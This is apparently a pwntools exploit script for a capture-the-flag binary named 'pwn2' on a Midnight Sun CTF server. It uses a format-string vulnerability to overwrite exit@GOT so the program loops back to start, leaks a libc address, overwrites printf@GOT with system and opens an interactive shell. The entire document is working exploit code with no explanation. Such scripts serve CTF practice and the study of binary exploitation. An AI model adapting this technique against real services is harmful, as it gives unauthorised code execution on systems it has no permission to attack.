import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='pwn2'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/i386-linux-gnu/libc.so.6")
pdbg.debug("2.23")
pdbg.remote('pwn2-01.play.midnightsunctf.se', 10002)
# pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			#io=pdbg.run("debug")
			io=pdbg.run("local")
			libc=pdbg.libc
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
			# one_gadgaet=[0x41602,0x41656,0xdef36]
		else :
			io=pdbg.run("remote")
			libc=ELF('./libc.so.6')
			# libc=ELF('../../x64libc/libc.so.6')
			# one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		
		fini_addr=0x0804AF10
		start_addr=0x80484A0
		pay=fmtstr_payload(7,{elf.got['exit']:start_addr},write_size='byte')
		pay+='%7$s'
		io.recvuntil("input: ")
		io.sendline(pay)

		libc_base=u32(io.recvuntil('\xf7')[-4:]+'')-libc.sym['__libc_start_main']
		libc.address=libc_base
		system_addr=libc.sym['system']
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		pay=fmtstr_payload(7,{elf.got['printf']:system_addr},write_size='byte')
		io.recvuntil("input: ")
		io.sendline(pay)






		success('libc_base:'+hex(libc_base))
		# pdbg.bp([])
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue